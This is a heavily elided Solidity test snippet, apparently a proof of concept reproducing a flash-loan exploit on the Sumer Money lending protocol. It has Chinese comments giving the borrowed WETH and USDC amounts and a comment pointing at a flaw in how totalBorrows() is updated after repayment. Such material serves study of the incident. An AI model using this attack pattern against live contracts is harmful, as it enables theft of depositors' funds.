...
contract SumerMoney is Test {
    ...
    function receiveFlashLoan(
        ...
        // amounts[0]為借到的WETH數量(150 ether)
        // amounts[1]為借到的USDC數量(645,000 USDC)
        WETH.withdraw(amounts[0]); // 換成ETH
        ...
        USDC.transfer(address(Balancer), amounts[1]); // 還給Balancer
    }
    ...
    function attack() external {
        ...
        // if the totalBorrows() isn't correctly decreased after repayment,
